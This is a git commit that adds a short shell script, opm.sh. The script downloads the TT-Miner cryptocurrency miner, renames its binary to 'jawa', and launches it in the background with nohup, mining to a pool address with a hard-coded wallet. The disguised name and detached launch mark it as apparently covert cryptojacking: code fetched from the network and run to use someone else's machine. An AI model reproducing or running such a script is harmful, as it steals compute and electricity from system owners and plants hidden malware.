e778a7fd3583b055a6a2d30ca04e376dcfa2cc91
apaple <76417012+apaple@users.noreply.github.com>
2024-08-25 12:48:28 +0700

    Create opm.sh

---
+++ opm.sh
@@ -0,0 +1,11 @@
+wget https://github.com/TrailingStop/TT-Miner-release/releases/download/2024.3.0/TT-Miner-2024.3.0.tar.gz
+
+tar -xvf TT-Miner-2024.3.0.tar.gz
+
+cd TT-Miner-2024.3.0
+
+mv TT-Miner jawa
+
+chmod u+x jawa
+
+nohup ./jawa -a spectrex -P qqzka7kf237a80wgg780fsvz6tyjc8paaw54urw3jmfxp73dh6ahkgvq0g5pe.rig@us.acc-pool.pw:18061
